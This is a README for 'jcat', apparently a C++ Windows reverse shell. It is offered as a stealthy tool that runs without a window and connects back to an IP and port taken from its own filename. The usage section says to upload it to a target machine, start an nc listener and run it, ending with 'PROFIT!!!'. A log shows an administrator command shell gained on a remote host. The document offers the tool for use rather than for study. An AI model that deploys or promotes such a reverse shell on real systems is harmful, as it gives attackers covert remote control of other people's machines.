# jcat Reverse Shell

This repository contains my C++ reverse shell that runs in the background without displaying a window. The program connects to a specified IP and port extracted from the executable's filename, providing a remote shell interface.

---

## 📋 Features
- **Stealth:** Runs in the background without opening a window.
- **Dynamic Configuration:** The IP address and port are encoded in the executable name, enabling customizable deployment.
- **Compact Implementation:** Uses native Windows APIs and WinSock for networking.
- **Small Size:** ~200kb.

---

## 🚀 How It Works
The executable name encodes the IP and port in the format:
- `jcat_<IP>_<PORT>.exe`
- `jcat_192.168.1.100_4444.exe`
- `jcat_192.168.1.121_80.exe`

The program parses the IP and port from its name and establishes a reverse connection to the remote server. Once connected, it spawns a hidden `cmd.exe` process, redirecting its input, output, and error streams to the socket.

---

## 🧑‍💻 Usage
1. upload the shell to the target machine
2. start a listener:
   ```bash
   nc -lvnp 80
3. execute the shell:
   ```bash
   jcat_172.16.1.129_80.exe
4. PROFIT!!!:
```bash
listening on [any] 80 ...
connect to [172.16.1.129] from (UNKNOWN) [172.16.1.131] 60507
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>whoami
whoami
tech\administrator

C:\Users\Administrator\Desktop>
